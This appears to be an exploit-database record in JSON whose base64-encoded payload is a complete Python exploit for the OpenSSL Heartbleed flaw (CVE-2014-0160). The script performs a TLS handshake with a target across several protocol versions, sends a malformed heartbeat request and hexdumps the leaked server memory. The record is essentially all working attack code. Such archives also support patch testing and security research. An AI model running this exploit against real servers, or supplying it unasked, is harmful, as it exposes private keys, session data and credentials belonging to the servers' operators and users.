{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBbT3BlblNTTCBUTFMgSGVhcnRiZWF0IEV4dGVuc2lvbiAtIE1lbW9yeSBEaXNjbG9zdXJlIC0gTXVsdGlwbGUgU1NML1RMUyB2ZXJzaW9uc10NCiMgRGF0ZTogWzIwMTQtMDQtMDldDQojIEV4cGxvaXQgQXV0aG9yOiBbQ3NhYmEgRml0emxdDQojIFZlbmRvciBIb21lcGFnZTogW2h0dHA6Ly93d3cub3BlbnNzbC5vcmcvXQ0KIyBTb2Z0d2FyZSBMaW5rOiBbaHR0cDovL3d3dy5vcGVuc3NsLm9yZy9zb3VyY2Uvb3BlbnNzbC0xLjAuMWYudGFyLmd6XQ0KIyBWZXJzaW9uOiBbMS4wLjFmXQ0KIyBUZXN0ZWQgb246IFtOL0FdDQojIENWRSA6IFsyMDE0LTAxNjBdDQoNCg0KIyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgUXVpY2sgYW5kIGRpcnR5IGRlbW9uc3RyYXRpb24gb2YgQ1ZFLTIwMTQtMDE2MCBieSBKYXJlZCBTdGFmZm9yZCAoanNwZW5ndWluQGpzcGVuZ3Vpbi5vcmcpDQojIFRoZSBhdXRob3IgZGlzY2xhaW1zIGNvcHlyaWdodCB0byB0aGlzIHNvdXJjZSBjb2RlLg0KIyBNb2RpZmllZCBieSBDc2FiYSBGaXR6bCBmb3IgbXVsdGlwbGUgU1NMIC8gVExTIHZlcnNpb24gc3VwcG9ydA0KDQppbXBvcnQgc3lzDQppbXBvcnQgc3RydWN0DQppbXBvcnQgc29ja2V0DQppbXBvcnQgdGltZQ0KaW1wb3J0IHNlbGVjdA0KaW1wb3J0IHJlDQpmcm9tIG9wdHBhcnNlIGltcG9ydCBPcHRpb25QYXJzZXINCg0Kb3B0aW9ucyA9IE9wdGlvblBhcnNlcih1c2FnZT0nJXByb2cgc2VydmVyIFtvcHRpb25zXScsIGRlc2NyaXB0aW9uPSdUZXN0IGZvciBTU0wgaGVhcnRiZWF0IHZ1bG5lcmFiaWxpdHkgKENWRS0yMDE0LTAxNjApJykNCm9wdGlvbnMuYWRkX29wdGlvbignLXAnLCAnLS1wb3J0JywgdHlwZT0naW50JywgZGVmYXVsdD00NDMsIGhlbHA9J1RDUCBwb3J0IHRvIHRlc3QgKGRlZmF1bHQ6IDQ0MyknKQ0KDQpkZWYgaDJiaW4oeCk6DQoJcmV0dXJuIHgucmVwbGFjZSgnICcsICcnKS5yZXBsYWNlKCdcbicsICcnKS5kZWNvZGUoJ2hleCcpDQoNCnZlcnNpb24gPSBbXQ0KdmVyc2lvbi5hcHBlbmQoWydTU0wgMy4wJywnMDMgMDAnXSkNCnZlcnNpb24uYXBwZW5kKFsnVExTIDEuMCcsJzAzIDAxJ10pDQp2ZXJzaW9uLmFwcGVuZChbJ1RMUyAxLjEnLCcwMyAwMiddKQ0KdmVyc2lvbi5hcHBlbmQoWydUTFMgMS4yJywnMDMgMDMnXSkNCg0KZGVmIGNyZWF0ZV9oZWxsbyh2ZXJzaW9uKToNCgloZWxsbyA9IGgyYmluKCcxNiAnICsgdmVyc2lvbiArICcgMDAgZGMgMDEgMDAgMDAgZDggJyArIHZlcnNpb24gKyAnJycgNTMNCjQzIDViIDkwIDlkIDliIDcyIDBiIGJjICAwYyBiYyAyYiA5MiBhOCA0OCA5NyBjZg0KYmQgMzkgMDQgY2MgMTYgMGEgODUgMDMgIDkwIDlmIDc3IDA0IDMzIGQ0IGRlIDAwDQowMCA2NiBjMCAxNCBjMCAwYSBjMCAyMiAgYzAgMjEgMDAgMzkgMDAgMzggMDAgODgNCjAwIDg3IGMwIDBmIGMwIDA1IDAwIDM1ICAwMCA4NCBjMCAxMiBjMCAwOCBjMCAxYw0KYzAgMWIgMDAgMTYgMDAgMTMgYzAgMGQgIGMwIDAzIDAwIDBhIGMwIDEzIGMwIDA5DQpjMCAxZiBjMCAxZSAwMCAzMyAwMCAzMiAgMDAgOWEgMDAgOTkgMDAgNDUgMDAgNDQNCmMwIDBlIGMwIDA0IDAwIDJmIDAwIDk2ICAwMCA0MSBjMCAxMSBjMCAwNyBjMCAwYw0KYzAgMDIgMDAgMDUgMDAgMDQgMDAgMTUgIDAwIDEyIDAwIDA5IDAwIDE0IDAwIDExDQowMCAwOCAwMCAwNiAwMCAwMyAwMCBmZiAgMDEgMDAgMDAgNDkgMDAgMGIgMDAgMDQNCjAzIDAwIDAxIDAyIDAwIDBhIDAwIDM0ICAwMCAzMiAwMCAwZSAwMCAwZCAwMCAxOQ0KMDAgMGIgMDAgMGMgMDAgMTggMDAgMDkgIDAwIDBhIDAwIDE2IDAwIDE3IDAwIDA4DQowMCAwNiAwMCAwNyAwMCAxNCAwMCAxNSAgMDAgMDQgMDAgMDUgMDAgMTIgMDAgMTMNCjAwIDAxIDAwIDAyIDAwIDAzIDAwIDBmICAwMCAxMCAwMCAxMSAwMCAyMyAwMCAwMA0KMDAgMGYgMDAgMDEgMDENCicnJykNCglyZXR1cm4gaGVsbG8NCg0KZGVmIGNyZWF0ZV9oYih2ZXJzaW9uKToNCgloYiA9IGgyYmluKCcxOCAnICsgdmVyc2lvbiArICcgMDAgMDMgMDEgNDAgMDAnKQ0KCXJldHVybiBoYg0KDQpkZWYgaGV4ZHVtcChzKToNCglmb3IgYiBpbiB4cmFuZ2UoMCwgbGVuKHMpLCAxNik6DQoJCWxpbiA9IFtjIGZvciBjIGluIHNbYiA6IGIgKyAxNl1dDQoJCWh4ZGF0ID0gJyAnLmpvaW4oJyUwMlgnICUgb3JkKGMpIGZvciBjIGluIGxpbikNCgkJcGRhdCA9ICcnLmpvaW4oKGMgaWYgMzIgPD0gb3JkKGMpIDw9IDEyNiBlbHNlICcuJyApZm9yIGMgaW4gbGluKQ0KCQlwcmludCAnICAlMDR4OiAlLTQ4cyAlcycgJSAoYiwgaHhkYXQsIHBkYXQpDQoJcHJpbnQNCg0KZGVmIHJlY3ZhbGwocywgbGVuZ3RoLCB0aW1lb3V0PTUpOg0KCWVuZHRpbWUgPSB0aW1lLnRpbWUoKSArIHRpbWVvdXQNCglyZGF0YSA9ICcnDQoJcmVtYWluID0gbGVuZ3RoDQoJd2hpbGUgcmVtYWluID4gMDoNCgkJcnRpbWUgPSBlbmR0aW1lIC0gdGltZS50aW1lKCkNCgkJaWYgcnRpbWUgPCAwOg0KCQkJcmV0dXJuIE5vbmUNCgkJciwgdywgZSA9IHNlbGVjdC5zZWxlY3QoW3NdLCBbXSwgW10sIDUpDQoJCWlmIHMgaW4gcjoNCgkJCWRhdGEgPSBzLnJlY3YocmVtYWluKQ0KCQkJIyBFT0Y/DQoJCQlpZiBub3QgZGF0YToNCgkJCQlyZXR1cm4gTm9uZQ0KCQkJcmRhdGEgKz0gZGF0YQ0KCQkJcmVtYWluIC09IGxlbihkYXRhKQ0KCXJldHVybiByZGF0YQ0KDQoNCmRlZiByZWN2bXNnKHMpOg0KCWhkciA9IHJlY3ZhbGwocywgNSkNCglpZiBoZHIgaXMgTm9uZToNCgkJcHJpbnQgJ1VuZXhwZWN0ZWQgRU9GIHJlY2VpdmluZyByZWNvcmQgaGVhZGVyIC0gc2VydmVyIGNsb3NlZCBjb25uZWN0aW9uJw0KCQlyZXR1cm4gTm9uZSwgTm9uZSwgTm9uZQ0KCXR5cCwgdmVyLCBsbiA9IHN0cnVjdC51bnBhY2soJz5CSEgnLCBoZHIpDQoJcGF5ID0gcmVjdmFsbChzLCBsbiwgMTApDQoJaWYgcGF5IGlzIE5vbmU6DQoJCXByaW50ICdVbmV4cGVjdGVkIEVPRiByZWNlaXZpbmcgcmVjb3JkIHBheWxvYWQgLSBzZXJ2ZXIgY2xvc2VkIGNvbm5lY3Rpb24nDQoJCXJldHVybiBOb25lLCBOb25lLCBOb25lDQoJcHJpbnQgJyAuLi4gcmVjZWl2ZWQgbWVzc2FnZTogdHlwZSA9ICVkLCB2ZXIgPSAlMDR4LCBsZW5ndGggPSAlZCcgJSAodHlwLCB2ZXIsIGxlbihwYXkpKQ0KCXJldHVybiB0eXAsIHZlciwgcGF5DQoNCmRlZiBoaXRfaGIocyxoYik6DQoJcy5zZW5kKGhiKQ0KCXdoaWxlIFRydWU6DQoJCXR5cCwgdmVyLCBwYXkgPSByZWN2bXNnKHMpDQoJCWlmIHR5cCBpcyBOb25lOg0KCQkJcHJpbnQgJ05vIGhlYXJ0YmVhdCByZXNwb25zZSByZWNlaXZlZCwgc2VydmVyIGxpa2VseSBub3QgdnVsbmVyYWJsZScNCgkJCXJldHVybiBGYWxzZQ0KDQoJCWlmIHR5cCA9PSAyNDoNCgkJCXByaW50ICdSZWNlaXZlZCBoZWFydGJlYXQgcmVzcG9uc2U6Jw0KCQkJaGV4ZHVtcChwYXkpDQoJCQlpZiBsZW4ocGF5KSA+IDM6DQoJCQkJcHJpbnQgJ1dBUk5JTkc6IHNlcnZlciByZXR1cm5lZCBtb3JlIGRhdGEgdGhhbiBpdCBzaG91bGQgLSBzZXJ2ZXIgaXMgdnVsbmVyYWJsZSEnDQoJCQllbHNlOg0KCQkJCXByaW50ICdTZXJ2ZXIgcHJvY2Vzc2VkIG1hbGZvcm1lZCBoZWFydGJlYXQsIGJ1dCBkaWQgbm90IHJldHVybiBhbnkgZXh0cmEgZGF0YS4nDQoJCQlyZXR1cm4gVHJ1ZQ0KDQoJCWlmIHR5cCA9PSAyMToNCgkJCXByaW50ICdSZWNlaXZlZCBhbGVydDonDQoJCQloZXhkdW1wKHBheSkNCgkJCXByaW50ICdTZXJ2ZXIgcmV0dXJuZWQgZXJyb3IsIGxpa2VseSBub3QgdnVsbmVyYWJsZScNCgkJCXJldHVybiBGYWxzZQ0KDQpkZWYgbWFpbigpOg0KCW9wdHMsIGFyZ3MgPSBvcHRpb25zLnBhcnNlX2FyZ3MoKQ0KCWlmIGxlbihhcmdzKSA8IDE6DQoJCW9wdGlvbnMucHJpbnRfaGVscCgpDQoJCXJldHVybg0KCWZvciBpIGluIHJhbmdlKGxlbih2ZXJzaW9uKSk6DQoJCXByaW50ICdUcnlpbmcgJyArIHZlcnNpb25baV1bMF0gKyAnLi4uJw0KCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KCQlwcmludCAnQ29ubmVjdGluZy4uLicNCgkJc3lzLnN0ZG91dC5mbHVzaCgpDQoJCXMuY29ubmVjdCgoYXJnc1swXSwgb3B0cy5wb3J0KSkNCgkJcHJpbnQgJ1NlbmRpbmcgQ2xpZW50IEhlbGxvLi4uJw0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJcy5zZW5kKGNyZWF0ZV9oZWxsbyh2ZXJzaW9uW2ldWzFdKSkNCgkJcHJpbnQgJ1dhaXRpbmcgZm9yIFNlcnZlciBIZWxsby4uLicNCgkJc3lzLnN0ZG91dC5mbHVzaCgpDQoJCXdoaWxlIFRydWU6DQoJCQl0eXAsIHZlciwgcGF5ID0gcmVjdm1zZyhzKQ0KCQkJaWYgdHlwID09IE5vbmU6DQoJCQkJcHJpbnQgJ1NlcnZlciBjbG9zZWQgY29ubmVjdGlvbiB3aXRob3V0IHNlbmRpbmcgU2VydmVyIEhlbGxvLicNCgkJCQlyZXR1cm4NCgkJCSMgTG9vayBmb3Igc2VydmVyIGhlbGxvIGRvbmUgbWVzc2FnZS4NCgkJCWlmIHR5cCA9PSAyMiBhbmQgb3JkKHBheVswXSkgPT0gMHgwRToNCgkJCQlicmVhaw0KDQoJCXByaW50ICdTZW5kaW5nIGhlYXJ0YmVhdCByZXF1ZXN0Li4uJw0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJcy5zZW5kKGNyZWF0ZV9oYih2ZXJzaW9uW2ldWzFdKSkNCgkJaWYgaGl0X2hiKHMsY3JlYXRlX2hiKHZlcnNpb25baV1bMV0pKToNCgkJCSNTdG9wIGlmIHZ1bG5lcmFibGUNCgkJCWJyZWFrDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQoJbWFpbigp", 
    "filename": "platforms/multiple/remote/32764.py", 
    "id": "32764", 
    "cves": [
        "CVE-2014-0160"
    ]
}